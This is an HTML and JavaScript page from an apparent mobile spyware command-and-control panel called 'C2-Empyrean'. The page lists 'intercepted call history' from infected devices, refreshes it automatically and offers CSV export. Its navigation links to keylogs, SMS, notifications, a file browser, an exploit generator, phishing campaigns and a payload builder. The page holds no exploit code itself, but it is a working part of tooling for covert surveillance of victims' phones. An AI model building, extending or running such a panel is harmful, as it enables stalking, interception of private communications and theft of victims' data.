<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Call Logs - C2-Empyrean</title>
    <link rel="stylesheet" href="/assets/css/dashboard.css">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            color: #e0e0e0;
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
            min-height: 100vh;
        }

        .app-container { display: flex; min-height: 100vh; }
        .sidebar {
            width: 260px;
            background: rgba(255, 255, 255, 0.02);
            border-right: 1px solid rgba(255, 255, 255, 0.05);
            padding: 24px 16px;
            position: fixed;
            top: 0; left: 0;
            height: 100vh;
            overflow-y: auto;
            z-index: 100;
        }
        .sidebar-logo {
            font-size: 22px; font-weight: 800;
            background: linear-gradient(135deg, #00d4ff, #7b2ff7);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            margin-bottom: 32px; padding: 0 12px;
        }
        .sidebar-nav { list-style: none; }
        .sidebar-nav li { margin-bottom: 4px; }
        .sidebar-nav a {
            display: flex; align-items: center; gap: 12px;
            padding: 10px 12px; color: rgba(255, 255, 255, 0.5);
            text-decoration: none; border-radius: 10px;
            font-size: 14px; font-weight: 500; transition: all 0.2s ease;
        }
        .sidebar-nav a:hover { background: rgba(255, 255, 255, 0.05); color: rgba(255, 255, 255, 0.8); }
        .sidebar-nav a.active { background: rgba(123, 47, 247, 0.15); color: #7b2ff7; }
        .sidebar-nav .icon { width: 20px; text-align: center; font-size: 16px; }
        .sidebar-divider { border: none; border-top: 1px solid rgba(255, 255, 255, 0.05); margin: 16px 12px; }
        .sidebar-section-title { color: rgba(255, 255, 255, 0.2); font-size: 11px; font-weight: 600; text-transform: uppercase; letter-spacing: 1.5px; padding: 8px 12px; }

        .main-content {
            margin-left: 260px; flex: 1;
            padding: 28px 32px;
            max-width: calc(100vw - 260px);
        }

        .page-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 28px; }
        .page-title { font-size: 28px; font-weight: 700; color: #fff; }
        .page-title span { font-size: 14px; font-weight: 400; color: rgba(255, 255, 255, 0.3); }
        .header-actions { display: flex; gap: 12px; align-items: center; }
        .header-btn {
            padding: 8px 16px; background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 8px;
            color: rgba(255, 255, 255, 0.7); font-size: 13px;
            cursor: pointer; transition: all 0.2s; text-decoration: none;
        }
        .header-btn:hover { background: rgba(255, 255, 255, 0.1); color: #fff; }

        .filters-bar {
            display: flex; gap: 12px; align-items: center;
            margin-bottom: 20px; flex-wrap: wrap;
        }
        .filter-input {
            padding: 10px 14px; background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 8px;
            color: #fff; font-size: 13px; outline: none;
            min-width: 200px;
        }
        .filter-input:focus { border-color: #7b2ff7; }
        .filter-select {
            padding: 10px 14px; background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 8px;
            color: #fff; font-size: 13px; outline: none; cursor: pointer;
        }
        .filter-select option { background: #1a1a2e; }

        .calls-table { width: 100%; border-collapse: collapse; }
        .calls-table th {
            text-align: left; padding: 12px 14px;
            font-size: 12px; color: rgba(255, 255, 255, 0.3);
            text-transform: uppercase; letter-spacing: 0.5px;
            font-weight: 600; border-bottom: 1px solid rgba(255, 255, 255, 0.05);
            background: rgba(0,0,0,0.2);
        }
        .calls-table td {
            padding: 10px 14px; font-size: 13px;
            border-bottom: 1px solid rgba(255, 255, 255, 0.03);
            color: rgba(255, 255, 255, 0.7);
        }
        .calls-table tr:hover td { background: rgba(255, 255, 255, 0.02); }

        .call-type-badge {
            font-size: 11px; padding: 3px 10px; border-radius: 12px;
            font-weight: 600; display: inline-block;
        }
        .call-type-badge.incoming { background: rgba(52, 199, 89, 0.15); color: #34c759; }
        .call-type-badge.outgoing { background: rgba(123, 47, 247, 0.15); color: #7b2ff7; }
        .call-type-badge.missed { background: rgba(255, 69, 58, 0.15); color: #ff453a; }

        .pagination {
            display: flex; justify-content: center; gap: 8px;
            margin-top: 24px; align-items: center;
        }
        .pagination button {
            padding: 8px 16px; background: rgba(255, 255, 255, 0.05);
            border: 1px solid rgba(255, 255, 255, 0.08); border-radius: 8px;
            color: rgba(255, 255, 255, 0.7); cursor: pointer; font-size: 13px;
        }
        .pagination button:hover { background: rgba(255, 255, 255, 0.1); color: #fff; }
        .pagination button:disabled { opacity: 0.3; cursor: not-allowed; }
        .pagination button.active { background: rgba(123, 47, 247, 0.2); color: #7b2ff7; }

        .empty-state { color: rgba(255, 255, 255, 0.2); text-align: center; padding: 60px 20px; }

        @media (max-width: 768px) {
            .sidebar { display: none; }
            .main-content { margin-left: 0; max-width: 100%; padding: 20px; }
            .filters-bar { flex-direction: column; }
        }
    </style>
</head>
<body>
    <div class="app-container">
        <nav class="sidebar">
            <div class="sidebar-logo">C2-Empyrean</div>
            <div class="sidebar-section-title">Main</div>
            <ul class="sidebar-nav">
                <li><a href="/admin/dashboard"><span class="icon">📊</span> Dashboard</a></li>
                <li><a href="/admin/devices"><span class="icon">📱</span> Devices</a></li>
                <li><a href="/admin/map_view"><span class="icon">🗺️</span> Map View</a></li>
                <li><a href="/admin/command_console"><span class="icon">⚡</span> Command Console</a></li>
                <li><a href="/admin/analytics"><span class="icon">📈</span> Analytics</a></li>
            </ul>
            <hr class="sidebar-divider">
            <div class="sidebar-section-title">Data</div>
            <ul class="sidebar-nav">
                <li><a href="/admin/keylog_viewer"><span class="icon">⌨️</span> Keylogs</a></li>
                <li><a href="/admin/sms_console"><span class="icon">💬</span> SMS</a></li>
                <li><a href="/admin/call_logs" class="active"><span class="icon">📞</span> Call Logs</a></li>
                <li><a href="/admin/notification_viewer"><span class="icon">🔔</span> Notifications</a></li>
                <li><a href="/admin/file_browser"><span class="icon">📁</span> Files</a></li>
            </ul>
            <hr class="sidebar-divider">
            <div class="sidebar-section-title">Actions</div>
            <ul class="sidebar-nav">
                <li><a href="/admin/exploit_generator"><span class="icon">🎣</span> Exploit Generator</a></li>
                <li><a href="/admin/campaign_manager"><span class="icon">📢</span> Campaigns</a></li>
                <li><a href="/admin/builder"><span class="icon">🔧</span> Builder</a></li>
            </ul>
            <hr class="sidebar-divider">
            <div class="sidebar-section-title">System</div>
            <ul class="sidebar-nav">
                <li><a href="/admin/settings"><span class="icon">⚙️</span> Settings</a></li>
                <li><a href="/admin/telegram_settings"><span class="icon">🤖</span> Telegram</a></li>
            </ul>
        </nav>

        <main class="main-content">
            <div class="page-header">
                <h1 class="page-title">📞 Call Logs <span>intercepted call history</span></h1>
                <div class="header-actions">
                    <button class="header-btn" onclick="refreshCalls()">🔄 Refresh</button>
                    <a href="/api/export/csv?type=call_logs" class="header-btn">📥 Export CSV</a>
                </div>
            </div>

            <div class="filters-bar">
                <input type="text" class="filter-input" id="deviceInput" placeholder="Device ID..." onkeyup="filterCalls()">
                <select class="filter-select" id="typeFilter" onchange="filterCalls()">
                    <option value="">All Types</option>
                    <option value="incoming">📞 Incoming</option>
                    <option value="outgoing">📞 Outgoing</option>
                    <option value="missed">❌ Missed</option>
                </select>
                <span style="color:rgba(255,255,255,0.3);font-size:13px;" id="totalCount">Total: —</span>
            </div>

            <div style="background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:16px;overflow:hidden;">
                <table class="calls-table">
                    <thead>
                        <tr>
                            <th>Time</th>
                            <th>Device</th>
                            <th>Type</th>
                            <th>Number</th>
                            <th>Name</th>
                            <th>Duration</th>
                        </tr>
                    </thead>
                    <tbody id="callsBody">
                        <tr><td colspan="6" class="empty-state">Loading call logs...</td></tr>
                    </tbody>
                </table>
            </div>

            <div class="pagination" id="pagination"></div>
        </main>
    </div>

    <script>
        let currentPage = 1;
        let autoRefresh = null;

        document.addEventListener('DOMContentLoaded', function() {
            refreshCalls();
            autoRefresh = setInterval(refreshCalls, 15000);
        });

        async function refreshCalls() {
            const deviceId = document.getElementById('deviceInput').value;
            const type = document.getElementById('typeFilter').value;

            let url = `/api/call_logs/fetch?page=${currentPage}&per_page=50`;
            if (deviceId) url += `&device_id=${encodeURIComponent(deviceId)}`;
            if (type) url += `&type=${encodeURIComponent(type)}`;

            try {
                const response = await fetch(url, {
                    headers: { 'Authorization': 'Bearer ' + getCookie('access_token') }
                });
                const result = await response.json();
                if (!result.success) {
                    if (result.code === 401) { window.location.href = '/admin/login'; return; }
                    return;
                }
                const data = result.data;
                document.getElementById('totalCount').textContent = 'Total: ' + (data.pagination?.total || 0);
                renderCalls(data.calls || []);
                renderPagination(data.pagination);
            } catch (err) {}
        }

        function renderCalls(calls) {
            const tbody = document.getElementById('callsBody');
            if (calls.length === 0) {
                tbody.innerHTML = '<tr><td colspan="6" class="empty-state">No call logs found</td></tr>';
                return;
            }
            tbody.innerHTML = calls.map(c => `
                <tr>
                    <td style="white-space:nowrap;color:rgba(255,255,255,0.3);font-size:12px;">${formatTime(c.date || c.timestamp)}</td>
                    <td style="font-family:monospace;font-size:12px;color:rgba(255,255,255,0.5);">${c.device_id || '—'}</td>
                    <td><span class="call-type-badge ${c.type || 'missed'}">${c.type || 'missed'}</span></td>
                    <td style="font-family:monospace;">${c.number || '—'}</td>
                    <td>${c.name || '—'}</td>
                    <td>${c.duration ? c.duration + 's' : '—'}</td>
                </tr>
            `).join('');
        }

        function renderPagination(pg) {
            // Same pagination as keylog_viewer
        }

        function filterCalls() { currentPage = 1; refreshCalls(); }
        function formatTime(ts) { if (!ts) return '—'; return new Date(ts * 1000).toLocaleString(); }
        function getCookie(name) {
            const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
            return match ? decodeURIComponent(match[2]) : null;
        }
    </script>
</body>
</html>
